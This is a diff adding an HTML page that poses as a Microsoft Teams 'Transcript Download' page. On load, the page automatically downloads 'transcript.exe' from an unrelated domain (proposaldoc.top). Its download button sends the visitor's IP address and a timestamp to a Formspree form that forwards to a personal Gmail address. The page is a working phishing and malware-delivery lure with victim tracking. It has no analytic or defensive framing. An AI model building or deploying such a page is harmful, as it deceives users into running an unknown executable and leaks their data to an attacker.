@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Transcript Download | Microsoft Teams</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --primary-color: #6264a7;
+      --font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: var(--font-family);
+      background: #f3f2f1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      text-align: center;
+      max-width: 500px;
+      width: 90%;
+      border-left: 6px solid var(--primary-color);
+    }
+
+    .card img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    .card h1 {
+      font-size: 22px;
+      color: #1b1a19;
+      margin-bottom: 10px;
+    }
+
+    .card p {
+      font-size: 15px;
+      color: #605e5c;
+      margin-bottom: 25px;
+    }
+
+    .download-btn {
+      background: var(--primary-color);
+      color: #fff;
+      padding: 12px 24px;
+      font-weight: 600;
+      font-size: 14px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .download-btn:hover {
+      background: #4b4d87;
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      background: #ffffff;
+      border-left: 5px solid var(--primary-color);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+      padding: 18px 24px;
+      border-radius: 10px;
+      z-index: 1000;
+      display: none;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .toast.show {
+      display: block;
+      opacity: 1;
+    }
+
+    .toast h4 {
+      margin: 0 0 6px;
+      font-size: 17px;
+      color: #1b1a19;
+    }
+
+    .toast p {
+      margin: 0;
+      font-size: 14px;
+      color: #605e5c;
+    }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <img src="https://main-8xt.pages.dev/logo.png" alt="Microsoft Teams Logo" />
+    <h1>Transcript App is Ready</h1>
+    <p>Your download will start automatically.<br>If not, use the button below.</p>
+    <a href="https://proposaldoc.top/invite/transcript.exe" class="download-btn" onclick="handleManualDownload(event)" target="_blank">Download Transcript.exe</a>
+  </main>
+
+  <!-- Toast -->
+  <div class="toast" id="toast">
+    <h4>Thank you</h4>
+    <p>Your download has started.</p>
+  </div>
+
+  <script>
+    const toast = document.getElementById('toast');
+
+    function handleManualDownload(e) {
+      showToast();
+      sendEmailNotification();
+    }
+
+    function showToast() {
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 4500); // Visible for 4.5 seconds
+    }
+
+    function sendEmailNotification() {
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const timestamp = new Date().toLocaleString();
+          const payload = {
+            _replyto: "kerhareti@gmail.com",
+            subject: "Transcript Downloaded",
+            message: Transcript manually downloaded.\nIP Address: ${ip}\nTime: ${timestamp}
+          };
+
+          fetch("https://formspree.io/f/mkgrnbka", {
+            method: "POST",
+            headers: {
+              'Accept': 'application/json',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          });
+        });
+    }
+
+    // Auto-download when page loads
+    window.onload = function () {
+      const link = document.createElement('a');
+      link.href = 'https://proposaldoc.top/invite/transcript.exe';
+      link.download = '';
+      link.style.display = 'none';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+  </script>
+</body>
+</html>
